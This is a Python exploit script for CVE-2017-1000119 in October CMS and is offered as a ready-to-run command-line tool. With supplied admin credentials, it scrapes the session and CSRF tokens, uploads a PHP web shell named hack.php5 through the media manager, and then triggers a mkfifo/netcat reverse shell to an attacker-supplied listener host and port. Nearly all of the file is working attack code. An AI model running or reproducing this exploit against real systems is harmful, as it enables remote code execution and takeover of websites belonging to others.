import requests
import string
import re
import sys
import base64
import argparse
import lxml.html
import random
from log_colors import *

# CVE-2017-1000119
class CVE2017_1000119:
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"
    }

    def __init__(self, url, user, pswd, lhost, lport):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.user, self.pswd = user, pswd
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    # login
    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        r = self.session.get(
            self.url.rstrip("/") + "/backend/backend/auth/signin", 
            headers = self.headers
        )
        tree = lxml.html.fromstring(r.text)
        key = tree.xpath('.//form//input[@name="_session_key"]/@value')
        key = key[0]
        token = tree.xpath('.//form/input[@name="_token"]/@value')
        token = token[0]
        print (LogColors.YELLOW + "key: " + key + "..." + LogColors.ENDC)
        print (LogColors.YELLOW + "token: " + token + "..." + LogColors.ENDC)
        data = {
            "login" : self.user,
            "password" : self.pswd,
            "_session_key" : key,
            "_token" : token,
            "postback" : "1",
        }
        r = self.session.post(self.url.rstrip("/") + "/backend/backend/auth/signin", 
            data = data, #headers = self.headers,
        )
        if r.ok:
            cs = r.headers['Set-Cookie'].split(";")[0].split("=")[-1]
            cookies = ["october_session=" + cs, "admin_auth=" + cs]
            self.headers["Cookie"] = ";".join(cookies)
            print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
            return r.text
        else:
            print (LogColors.RED + "login failed :(" + LogColors.ENDC)
            sys.exit()

    # get x-csrf-token
    def get_token(self):
        print (LogColors.BLUE + "get x-csrf-token..." + LogColors.ENDC)
        media_url = self.url.rstrip("/") + "/backend/cms/media"
        r = self.session.get(media_url)
        if r.ok:
            tree = lxml.html.fromstring(r.text)
            csrf = tree.xpath(".//meta[@name='csrf-token']/@content")
            csrf = csrf[0]
            print (LogColors.YELLOW + "x-csrf-token: " + csrf + LogColors.ENDC)
            self.csrf = csrf
        else:
            print (LogColors.RED + "failed get x-csrf-token..." + LogColors.ENDC)
            sys.exit()

    # exploitation logic, upload php5 file
    def exploit(self):
        self.login()
        self.get_token()
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        self.headers['X-CSRF-TOKEN'] = self.csrf
        self.headers['X-OCTOBER-FILEUPLOAD'] = 'MediaManager-manager'
        self.headers['X-Requested-With'] = 'XMLHttpRequest'
        #print (self.headers)
        boundary_id = ''.join(random.choice(string.digits) for i in range(29))
        ctype = 'multipart/form-data;' 
        ctype += 'boundary=---------------------------' + boundary_id
        self.headers["Content-Type"] = ctype
        exploitation_url = self.url.rstrip("/") + "/backend/cms/media"
        self.headers['Referer'] = exploitation_url
        self.headers['Connection'] = 'keep-alive'
        self.headers['Accept'] = 'application/json'
        self.headers['DNT'] = '1'
        cmd = "<?php system($_REQUEST['cmd']); ?>"
        print (LogColors.YELLOW + str(len(cmd)) + " bytes payload..." + LogColors.ENDC)
        pay = "-----------------------------"
        pay += boundary_id
        pay += "\r\nContent-Disposition: form-data;"
        pay += ' name="path"'
        pay += "\r\n\r\n"
        pay += "/"
        pay += "\r\n"
        pay += "-----------------------------"
        pay += boundary_id
        pay += "\r\nContent-Disposition: form-data;"
        pay += ' name="file_data"; filename="hack.php5"'
        pay += '\r\nContent-Type: application/x-php\r\n\r\n'
        pay += "<?php system($_REQUEST['cmd']); ?>"
        pay += "\r\n\r\n-----------------------------"
        pay += boundary_id
        pay += "--\r\n"
        print (LogColors.YELLOW + exploitation_url + "..." + LogColors.ENDC)
        self.headers["Content-Length"] = str(len(pay))
        try:
            r = self.session.post(
                exploitation_url,
                headers = self.headers,
                data = pay
            )
            if r.ok:
                print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "sending payload failed :(" + LogColors.ENDC)
                sys.exit()
        except Exception as e:
            print (LogColors.RED + "sending payload failed :(" + LogColors.ENDC)
            sys.exit()

    # getting reverse shell
    def reverse_shell(self):
        print (LogColors.BLUE + "get reverse shell..." + LogColors.ENDC)
        reverse_shell = "rm /tmp/f;mkfifo"
        reverse_shell += " /tmp/f;cat /tmp/f|/bin/sh -i 2>&1"
        reverse_shell += "|nc " + self.lhost + " " + self.lport + " >/tmp/f"
        import urllib.parse
        params = urllib.parse.urlencode(
            {"cmd" : reverse_shell}, quote_via = urllib.parse.quote_plus
        )
        url = self.url.rstrip() + "/storage/app/media/hack.php5?" + params
        r = self.session.get(url)
        print (LogColors.GREEN + "successfully got reverse shell :)" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-user','--username', required = True, help = "auth username")
    parser.add_argument('-pswd','--password', required = True, help = "auth password")
    parser.add_argument('-lh','--lhost', required = True, help = "reverse shell listener host")
    parser.add_argument('-lp','--lport', required = True, help = "reverse shell listener port")
    args = vars(parser.parse_args())
    url = args["url"]
    user, pswd = args["username"], args["password"]
    lhost, lport = args['lhost'], args['lport']
    cve = CVE2017_1000119(url, user, pswd, lhost, lport)
    cve.exploit()
    cve.reverse_shell()

